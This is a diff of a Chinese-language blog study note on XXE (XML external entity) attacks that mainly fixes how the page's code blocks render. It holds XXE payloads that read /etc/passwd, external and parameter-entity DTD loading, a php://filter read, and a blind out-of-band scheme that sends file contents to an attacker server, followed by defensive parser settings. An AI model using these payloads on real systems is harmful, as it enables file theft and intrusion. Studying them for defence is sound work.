@@ -447,27 +447,67 @@ $">
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
 </code></pre>
 <ul>
-<li>直接通过外部实体DTD声明<br><code>`</code>xml</li>
+<li>直接通过外部实体DTD声明</li>
 </ul>
-<p>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM “file:///etc/passwd” &gt;]&gt;</p>
-<root><br><name>&xxe;</name><br></root><br><code>- 通过外部实体引入外部DTD文档，再引入外部实体声明[没有验证成功，更换引用本地dtd也只能读取，解析出错]
-这种命名实体调用外部实体，发现xxe.dtd中不能定义/声明实体，否则解析不了。</code>xml<br><br>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;!DOCTYPE xxe<br>[&lt;!ENTITY  a  SYSTEM “<a href="http://127.0.0.1:8888/test/xxe.dtd&quot;" target="_blank" rel="noopener">http://127.0.0.1:8888/test/xxe.dtd&quot;</a> &gt;]&gt;<br><br><name>&b;</name><br><br><code>- 通过外部参数实体引入外部实体声明</code>xml<br><br>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;!DOCTYPE xxe [<br>        &lt;!ENTITY % xxe SYSTEM “<a href="http://127.0.0.1:8888/test/xxe.dtd&quot;" target="_blank" rel="noopener">http://127.0.0.1:8888/test/xxe.dtd&quot;</a> &gt;<br>%xxe;<br>]&gt;<br><name>&b;</name><br><br><code>### XXE攻击面的拓展
-#### XXE漏洞检测流程
-##### 有回显测试
-- 测试是否解析xml：</code>xml<br><br>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;<br><br>&lt;!DOCTYPE ANY [<br>&lt;!ENTITY test “test”&gt;<br>]&gt;<br><br><root>&test;</root>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY ></span>
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
+</code></pre>
+<ul>
+<li>通过外部实体引入外部DTD文档，再引入外部实体声明[没有验证成功，更换引用本地dtd也只能读取，解析出错]<br>这种命名实体调用外部实体，发现xxe.dtd中不能定义/声明实体，否则解析不了。</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE xxe 
+[&lt;!ENTITY  a  SYSTEM "http://127.0.0.1:8888/test/xxe.dtd" ></span>]>
 
-<pre><code>- 测试是否支持外部实体
-用外部参数/普通实体测试一下 (system)
-```xml
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
 
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre><h5 id="无回显测试"><a href="#无回显测试" class="headerlink" title="无回显测试"></a>无回显测试</h5><p>无防火墙的情况下，可以尝试ssrf</p>
+</code></pre>
+<ul>
+<li>通过外部参数实体引入外部实体声明</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE xxe [
+        &lt;!ENTITY % xxe SYSTEM "http://127.0.0.1:8888/test/xxe.dtd" ></span>
+%xxe;
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+
+</code></pre>
+<h3 id="XXE攻击面的拓展"><a href="#XXE攻击面的拓展" class="headerlink" title="XXE攻击面的拓展"></a>XXE攻击面的拓展</h3><h4 id="XXE漏洞检测流程"><a href="#XXE漏洞检测流程" class="headerlink" title="XXE漏洞检测流程"></a>XXE漏洞检测流程</h4><h5 id="有回显测试"><a href="#有回显测试" class="headerlink" title="有回显测试"></a>有回显测试</h5><ul>
+<li>测试是否解析xml：</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token prolog">&lt;?xml version=”1.0” encoding=”UTF-8”?></span>
+
+<span class="token doctype">&lt;!DOCTYPE ANY [
+&lt;!ENTITY test "test"></span>
+]>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
+
+</code></pre>
+<ul>
+<li>测试是否支持外部实体<br>用外部参数/普通实体测试一下 (system)</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY ></span>
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
+
+</code></pre>
+<h5 id="无回显测试"><a href="#无回显测试" class="headerlink" title="无回显测试"></a>无回显测试</h5><p>无防火墙的情况下，可以尝试ssrf</p>
 <pre class=" language-xml"><code class="language-xml">
 <span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
 <span class="token doctype">&lt;!DOCTYPE root [
@@ -476,10 +516,13 @@ $">
 </code></pre>
 <h4 id="面对有回显和无回显部分"><a href="#面对有回显和无回显部分" class="headerlink" title="面对有回显和无回显部分"></a>面对有回显和无回显部分</h4><p>有回显比较简单暂不考虑</p>
 <p>无回显：Blind XXE 构建带外信道</p>
-<h5 id="无回显任意文件读取"><a href="#无回显任意文件读取" class="headerlink" title="无回显任意文件读取"></a>无回显任意文件读取</h5><p>‘’’<br>php://filter/read=convert.base64-encode/resource=./target.php<br>‘’’<br>获取目标内容<br>然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx</p>
+<h5 id="无回显任意文件读取"><a href="#无回显任意文件读取" class="headerlink" title="无回显任意文件读取"></a>无回显任意文件读取</h5><pre><code>php://filter/read=convert.base64-encode/resource=./target.php 
+
+</code></pre><p>获取目标内容<br>然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx</p>
 <p>理论上来说 此处使用的逻辑：<br>通过嵌套形式的使用建立带外数据通道</p>
 <p>直接在内部实体声明中引用另一个实体如下：</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
 <span class="token doctype">&lt;!DOCTYPE xxe [
 &lt;!ELEMENT name ANY></span>
 &lt;!ENTITY % param1 SYSTEM "file:///etc/passwd">
@@ -511,11 +554,14 @@ xx.xx.xx.xx - - [28/Dec/2018:12:44:24 +0800] &quot;GET /?PD9waHAKJF8gPSAoJ2EnLid
 
 </code></pre><p>达到任意文件读取的目的<br>但etc/passwd 直接读取编码后，（用get请求发送会显示读取字符串太长；初步测试长度hash后2945,但感觉这个数据有点怪异，有可能是其他原因）</p>
 <p>此处也可以使用支持的其他协议：</p>
-<p>libxml2支持: file/http/ftp</p>
-<p>php支持：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar</p>
-<p>java支持: http/https/ftp/file/jar/netdoc/mailto/gopher</p>
-<p>NET支持:file/http/https/ftp</p>
-<h5 id="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"><a href="#但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充" class="headerlink" title="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"></a>但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充</h5><h4 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h4><p>学习到这里 顺便学一下 XML解析器</p>
+<pre><code>libxml2支持: file/http/ftp
+
+php支持：file/http/ftp/php/compress.zlib/compress.bzip2/data/glob/phar
+
+java支持: http/https/ftp/file/jar/netdoc/mailto/gopher
+
+NET支持:file/http/https/ftp
+</code></pre><h5 id="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"><a href="#但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充" class="headerlink" title="但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充"></a>但当探测当目标具有防火墙或类似防护时，即不能直接通过ssrf判断是否存在时，需要变换思路-待补充</h5><h4 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h4><p>学习到这里 顺便学一下 XML解析器</p>
 <h3 id="XXE危害："><a href="#XXE危害：" class="headerlink" title="XXE危害："></a>XXE危害：</h3><ul>
 <li>读取任意文件：</li>
 <li>命令执行<br>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装</li>
@@ -523,15 +569,27 @@ xx.xx.xx.xx - - [28/Dec/2018:12:44:24 +0800] &quot;GET /?PD9waHAKJF8gPSAoJ2EnLid
 <li>拒绝服务</li>
 </ul>
 <h5 id="XXE防御："><a href="#XXE防御：" class="headerlink" title="XXE防御："></a>XXE防御：</h5><ul>
-<li>最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD，即禁用外部实体<br><code>`</code><br>PHP：<br>libxml_disable_entity_loader(true);</li>
+<li>最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD，即禁用外部实体</li>
 </ul>
-<p>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</p>
-<p>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
-<pre><code>- 过滤用户提交的XML数据
-</code></pre><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC</p>
-<pre><code>参考资料：
-</code></pre><p><a href="http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html" target="_blank" rel="noopener">http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html</a><br><a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="noopener">https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/</a><br><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/43775691</a><br><code>`</code></p>
+<pre><code>PHP：
+libxml_disable_entity_loader(true);
 
+JAVA:
+DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+
+Python：
+from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code></pre><ul>
+<li>过滤用户提交的XML数据</li>
+</ul>
+<pre><code>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC
+</code></pre><p>参考资料：</p>
+<pre><code>http://docs.ioin.in/writeup/mohemiv.com/_all_exploiting_xxe_with_local_dtd_files_/index.html
+https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/
+https://blog.csdn.net/u011721501/article/details/43775691 
+</code></pre>
             </div>
             <hr/>
 
